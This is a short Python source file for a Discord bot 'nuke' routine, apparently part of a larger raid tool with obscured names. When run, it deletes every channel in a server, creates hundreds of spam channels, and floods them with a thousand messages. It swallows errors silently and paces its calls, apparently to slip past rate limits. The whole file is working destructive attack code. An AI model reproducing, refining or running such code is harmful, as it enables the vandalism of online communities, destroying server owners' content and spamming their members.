
import asyncio
import discord
import random
import time
from core.b._73 import _73

class _74:
    def __init__(self, guild):
        self.guild = guild
        self.channels = []
    
    async def _75(self):
        start = time.perf_counter()
        _73("STARTING NUKE")
        for channel in self.guild.channels:
            try:
                await channel.delete()
                await asyncio.sleep(0.5)
            except:
                pass
        for i in range(500):
            name = random.choice(["Name1","Name2","Name3","Name4","Name5"])
            try:
                ch = await self.guild.create_text_channel(name)
                self.channels.append(ch)
                if i % 50 == 0:
                    await asyncio.sleep(0.1)
            except:
                pass
        for i in range(1000):
            ch = self.channels[i % len(self.channels)]
            try:
                await ch.send("text")
                if i % 100 == 0:
                    await asyncio.sleep(0.05)
            except:
                pass
        elapsed = time.perf_counter() - start
        _73(f"NUKE FINISHED IN {elapsed:.2f}s")
